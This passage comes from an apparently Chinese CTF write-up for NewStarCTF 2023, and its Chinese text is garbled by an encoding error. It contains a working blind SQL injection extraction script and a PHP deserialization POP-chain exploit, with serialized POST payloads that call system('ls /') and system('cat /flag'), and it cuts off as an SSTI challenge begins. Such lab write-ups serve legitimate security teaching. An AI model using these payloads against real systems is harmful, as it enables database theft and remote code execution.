ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((seLEct(Group_cOncAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload3)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010215536171.png" alt="image-20231010215536171"></p><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥è°ƒç”¨__toString()å‡½æ•°=&gt;$this-&gt;name=new Then()</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨ç±»è°ƒç”¨ï¼Œå¯ä»¥ç”¨äºå¯åŠ¨__invoke()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å¯ä»¥æŒ‡å®šç±»çš„å‡½æ•°end()å‡½æ•°è°ƒç”¨</span><br>        <span class="hljs-comment">//$this-&gt;obj=new CTF()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//getSträ¸ºHandleç±»çš„ä¸å­˜åœ¨å‡½æ•°æ‰€ä»¥å¯ä»¥ç”¨äºè°ƒç”¨__call</span><br>        <span class="hljs-comment">//$this-&gt;obj=new Handle()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å˜é‡åˆ é™¤å‡½æ•°å¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•__unset</span><br>        <span class="hljs-comment">//$this-&gt;handle-&gt;log=$WhiteGod-&gt;$func</span><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å±é™©å‡½æ•°æ³¨å…¥=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br><br></code></pre></td></tr></table></figure><p>popé“¾æ„é€ :</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.WhiteGod-&gt;__unset<br>2.CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>3.Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>4.Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>5.Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>6.Begin-&gt;__destruct=&gt;Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br></code></pre></td></tr></table></figure><p>é­”æœ¯å‡½æ•°ä»‹ç»:</p><p>__unsetï¼ˆï¼‰é­”æœ¯æ–¹æ³•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">__unset()é­”æœ¯æ–¹æ³•åœ¨ä½¿ç”¨unset()å‡½æ•°åˆ é™¤ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚å½“ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«unsetæ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡å®šä¹‰äº†__unset()æ–¹æ³•ï¼Œé‚£ä¹ˆè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$property</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Unsetting property: &quot;</span> . <span class="hljs-variable">$property</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$obj</span>-&gt;name); <span class="hljs-comment">// è°ƒç”¨__unset()æ–¹æ³•</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªMyClassç±»ï¼Œå®ƒæœ‰ä¸€ä¸ªç§æœ‰å±æ€§<span class="hljs-variable">$name</span>ã€‚å½“ä½¿ç”¨<span class="hljs-keyword">unset</span>()å‡½æ•°åˆ é™¤<span class="hljs-variable">$obj</span>å¯¹è±¡çš„<span class="hljs-variable">$name</span>å±æ€§æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•ä¼šæ˜¾ç¤ºä¸€ä¸ªæ¶ˆæ¯<span class="hljs-string">&quot;Unsetting property: name&quot;</span>ã€‚<br><br>æ³¨æ„ï¼Œ<span class="hljs-title function_ invoke__">__unset</span>()æ–¹æ³•åªä¼šåœ¨è®¿é—®æƒé™å…è®¸çš„æƒ…å†µä¸‹è¢«è°ƒç”¨ã€‚å¦‚æœå±æ€§æ˜¯ç§æœ‰çš„æˆ–å—ä¿æŠ¤çš„ï¼Œåªæœ‰åœ¨ç±»çš„å†…éƒ¨æ‰èƒ½åˆ é™¤è¯¥å±æ€§ã€‚<br></code></pre></td></tr></table></figure><p>popé“¾æ„é€ è„šæœ¬:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-comment">// public function __destruct()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥è°ƒç”¨__toString()å‡½æ•°=&gt;$this-&gt;name=new Then()</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Hello&quot;;</span><br>    <span class="hljs-comment">//     &#125;else&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Welcome to NewStarCTF 2023!&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨ç±»è°ƒç”¨ï¼Œå¯ä»¥ç”¨äºå¯åŠ¨__invoke()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __call($func, $vars)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å¯ä»¥æŒ‡å®šç±»çš„å‡½æ•°end()å‡½æ•°è°ƒç”¨</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new CTF()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;end();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __invoke()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //getSträ¸ºHandleç±»çš„ä¸å­˜åœ¨å‡½æ•°æ‰€ä»¥å¯ä»¥ç”¨äºè°ƒç”¨__call</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new Handle()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;getStr();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     die(&quot;==GAME OVER==&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å˜é‡åˆ é™¤å‡½æ•°å¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•__unset</span><br>    <span class="hljs-comment">//     //$this-&gt;handle=new WhiteGod()</span><br>    <span class="hljs-comment">//     unset($this-&gt;handle-&gt;log);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-comment">// public function __unset($var)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //å­˜åœ¨å±é™©å‡½æ•°æ³¨å…¥=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>    <span class="hljs-comment">//     ($this-&gt;func)($this-&gt;var);    </span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-comment">// @unserialize($_POST[&#x27;pop&#x27;]); </span><br><span class="hljs-comment">//æ„é€ popé“¾:</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$obj</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj3</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj3</span>;<br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133441613.png" alt="image-20231010133441613"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133746261.png" alt="image-20231010133746261"></p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/images/2023-11-3-newstar-3/image-20231010141411989.png" alt="image-20231010141411989"></p><p>ä½¿ç”¨BpæŠ“åŒ…:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141442978.png" alt="image-20231010141442978"></p><p>è®¿é—®:&#x2F;secr3tofpop</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141614595.png" alt="image-20231010141614595"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010141800190.png" alt="image-20231010141800190"></p><p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¢«æ¸²æŸ“åˆ°äº†ç½‘é¡µä¸Šï¼ŒçŒœæµ‹å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 